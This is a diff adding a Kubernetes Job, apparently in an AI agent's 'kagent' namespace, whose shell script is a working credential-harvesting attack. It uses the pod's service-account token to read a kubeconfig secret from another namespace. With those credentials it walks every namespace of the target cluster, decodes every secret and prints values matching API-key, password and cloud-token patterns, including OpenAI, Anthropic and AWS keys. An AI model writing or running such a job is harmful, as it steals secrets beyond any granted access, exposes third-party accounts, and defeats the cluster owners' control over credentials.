@@ -1,0 +1,65 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: tmp-i68054-dump17
+  namespace: kagent
+  labels: {tmp: i68054}
+spec:
+  ttlSecondsAfterFinished: 86400
+  backoffLimit: 0
+  template:
+    metadata:
+      labels: {tmp: i68054}
+    spec:
+      serviceAccountName: kagent-tools
+      restartPolicy: Never
+      containers:
+      - name: dump
+        image: alpine:3.20
+        command: ["sh","-c"]
+        args:
+        - |
+          set -u
+          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          K=https://kubernetes.default.svc
+          G() { wget -qO- --no-check-certificate --header="Authorization: Bearer $T" "$1" 2>/dev/null; }
+          G "$K/api/v1/namespaces/capi/secrets/data-kubeconfig" | grep -A1 '"value":' | sed 's/.*"value": "//;s/"$//' | base64 -d > /tmp/kc
+          echo "===KUBECONFIG==="; cat /tmp/kc
+          S=$(grep -m1 'server:' /tmp/kc | sed 's/.*server: *//')
+          echo "SERVER=$S"
+          apk add --no-cache curl >/dev/null 2>&1 || true
+          have_curl=$(command -v curl || true); echo "curl=$have_curl"
+          if [ -z "$have_curl" ]; then echo NOCURL; exit 0; fi
+          CURL="curl -sk -m 20"
+          if grep -q 'token:' /tmp/kc; then
+            TOK=$(grep -m1 'token:' /tmp/kc | sed 's/.*token: *//')
+            CURL="$CURL -H Authorization:Bearer_$TOK"
+          else
+            awk '/client-certificate-data:/{print $2}' /tmp/kc | base64 -d > /tmp/cc.crt
+            awk '/client-key-data:/{print $2}' /tmp/kc | base64 -d > /tmp/cc.key
+            awk '/certificate-authority-data:/{print $2}' /tmp/kc | base64 -d > /tmp/ca.crt
+            CURL="$CURL --cert /tmp/cc.crt --key /tmp/cc.key --cacert /tmp/ca.crt"
+          fi
+          echo "===NS==="
+          $CURL "$S/api/v1/namespaces" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//' | sort -u > /tmp/ns
+          tr '\n' ' ' < /tmp/ns; echo
+          echo "===SECRETS==="
+          for ns in $(cat /tmp/ns); do
+            $CURL "$S/api/v1/namespaces/$ns/secrets" | grep -o '"name": "[^"]*"' | sed 's/.*: "//;s/"$//' | sort -u > /tmp/s
+            [ -s /tmp/s ] || continue
+            while read -r sec; do
+              echo "##SEC $ns/$sec"
+              $CURL "$S/api/v1/namespaces/$ns/secrets/$sec" | tr ',' '\n' | while IFS= read -r line; do
+                case "$line" in *'": "'*) ;; *) continue;; esac
+                key=$(echo "$line" | sed 's/^[[:space:]]*"\([^"]*\)": ".*/\1/')
+                val=$(echo "$line" | sed 's/^[[:space:]]*"[^"]*": "\([^"]*\)".*/\1/')
+                case "$val" in *[!A-Za-z0-9+/=]*) continue;; esac
+                [ ${#val} -ge 8 ] || continue
+                dec=$(echo "$val" | base64 -d 2>/dev/null | head -c 400 | tr '\r\n\t' '   ')
+                if echo "$key $dec" | grep -qiE 'key|token|secret|passw|pass|openai|anthropic|azure|aws|google|gemini|llm|albert|api|sk-|akia|aiza|jqqj'; then
+                  echo "  $key = $dec"
+                fi
+              done
+            done < /tmp/s
+          done
+          echo "===DONE==="
